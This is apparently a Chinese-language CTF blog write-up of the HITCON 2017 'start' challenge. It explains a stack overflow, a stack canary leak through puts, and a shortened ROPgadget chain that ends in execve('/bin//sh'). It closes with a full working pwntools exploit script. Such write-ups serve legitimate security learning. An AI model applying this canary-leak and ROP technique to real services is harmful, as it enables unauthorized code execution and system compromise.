---
title: syscall to rop
authorId: hac425
tags:
  - rop
  - syscall
categories:
  - ctf
date: 2017-12-16 14:22:00
---
### 前言 

`hitcon 2017` 的 `start` 题，比较简单，练练手。

题目链接：

https://gitee.com/hac425/blog_data/tree/master/hitcon2017



### 正文

![paste image](http://oy9h5q2k4.bkt.clouddn.com/1513405464132pvttkl9d.png?imageslim)

往 `rbp-0x20` 读入 `0xd9` 的数据，溢出。
程序开了 `cancary` ，又后面直接 `puts` 把我们输入的打印出来

![paste image](http://oy9h5q2k4.bkt.clouddn.com/1513405574819gtyg37m3.png?imageslim)

我们可以直接溢出到 `cancary`, 然后用 `puts` 泄露 `cancary`， 这里有个小 `tips` , `cancary` 的最低位 为 `\x00`, 我们需要多多溢出一个 字节，覆盖掉这个 `\x00`, 这样才能 泄露 `cancary`。

![paste image](http://oy9h5q2k4.bkt.clouddn.com/15134057198437r3x6q4n.png?imageslim)
拿到 `cancary` 后就是正常的 `rop` 了，直接使用 

```
ROPgadget --binary ./start --ropchain
```
生成 `rop` 链，不过此时的 `rop` 链太长，我们需要改一改。

![paste image](http://oy9h5q2k4.bkt.clouddn.com/1513405845676igvlyleg.png?imageslim)

后面用来大量的  `add` 来设置 `rax` 设置后面的 `syscall` 的系统调用号。最后调用 `execve(“/bin//sh”, 0, 0)`, 把这一大串直接用前面找到的 `gadgets` 替换掉即可。

![paste image](http://oy9h5q2k4.bkt.clouddn.com/15134060054129ceaklcy.png?imageslim)
长度刚好。



### 总结

`rop` 没必要一个一个手撸， 改改生成的就行，然后就是 `send` 之间一定要 `sleep` ,要不然玄学......



完整exp

```
#!/usr/bin/env python
# encoding: utf-8

from pwn import *
context.log_level = "debug"

from struct import pack
import time

# Padding goes here
p = ''

p += pack('<Q', 0x00000000004017f7) # pop rsi ; ret
p += pack('<Q', 0x00000000006cc080) # @ .data
p += pack('<Q', 0x000000000047a6e6) # pop rax ; pop rdx ; pop rbx ; ret
p += '/bin//sh'
p += pack('<Q', 0x4141414141414141) # padding
p += pack('<Q', 0x4141414141414141) # padding
p += pack('<Q', 0x0000000000475fc1) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x00000000004017f7) # pop rsi ; ret
p += pack('<Q', 0x00000000006cc088) # @ .data + 8
p += pack('<Q', 0x000000000042732f) # xor rax, rax ; ret
p += pack('<Q', 0x0000000000475fc1) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x00000000004005d5) # pop rdi ; ret
p += pack('<Q', 0x00000000006cc080) # @ .data
p += pack('<Q', 0x00000000004017f7) # pop rsi ; ret
p += pack('<Q', 0x00000000006cc088) # @ .data + 8
p += pack('<Q', 0x0000000000443776) # pop rdx ; ret
p += pack('<Q', 0x00000000006cc088) # @ .data + 8

p += p64(0x000000000047a6e6)
p += p64(59)
p += p64(0)
p += p64(0)
p += p64(0x0000000000468e75)


print(hex(len(p)))

print hex(len(p))
rop = p

r  = process("./start")
# gdb.attach(r, '''
# # bp *0x0400B5C
# bp *0x0400B96
# c

# 	''')

pause()

# it could send "b" *0x18 + "\n"
r.sendline("b" * ( 0x20 - 0x8 ))

time.sleep(0.2)
r.recvuntil("b" * ( 0x20 - 0x8 ))
r.recv(1)
cancary = u64("\x00" + r.recv(7))

log.info("get cancary: " + hex(cancary))
pause()

payload = "exit\n\x00"
payload += "b" * ( 0x20 - 0x8 - len(payload))  # padding for cancary
payload += p64(cancary)
payload += "A" * 8  # padding for ret 
payload += rop    # rip


print hex(len(payload))

r.sendline(payload)
time.sleep(0.2)

r.interactive()

```